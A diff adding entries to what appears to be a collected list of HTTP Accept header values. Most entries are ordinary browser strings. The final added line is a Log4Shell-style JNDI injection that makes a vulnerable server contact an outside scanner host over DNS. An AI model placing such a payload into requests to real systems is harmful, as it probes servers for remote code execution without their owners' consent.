@@ -1,5 +1,6 @@
 */*
 /
+Accept:*/*
 application/dns-message
 application/json
 application/json, text/javascript, */*; q=0.01
@@ -19,6 +20,7 @@ image/webp,*/*;q=0.8
 image/webp,image/apng,image/*,*/*;q=0.8
 image/webp,image/png,image/svg+xml,image/*;q=0.8,video/*;q=0.8,*/*;q=0.5
 text/html
+text/html, */*
 text/html, application/xhtml+xml, */*
 text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
 text/html,*/*
@@ -27,6 +29,7 @@ text/html,application/xhtml+xml,application/signed-exchange;v=b3,application/xml
 text/html,application/xhtml+xml,application/signed-exchange;v=b3,application/xml;q=0.9,*/*;q=0.8,text/html,application/xhtml+xml,application/signed-exchange;v=b3,application/xml;q=0.9,*/*;q=0.8
 text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng, */*;q=0.8,application/signed-exchange;v=b3;q=0.9
 text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
 text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
 text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
@@ -34,3 +37,4 @@ text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;
 text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
 text/plain,text/html,*/*
 text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+{jndi:dns://204-48-20-180.accept.scanworld.net}
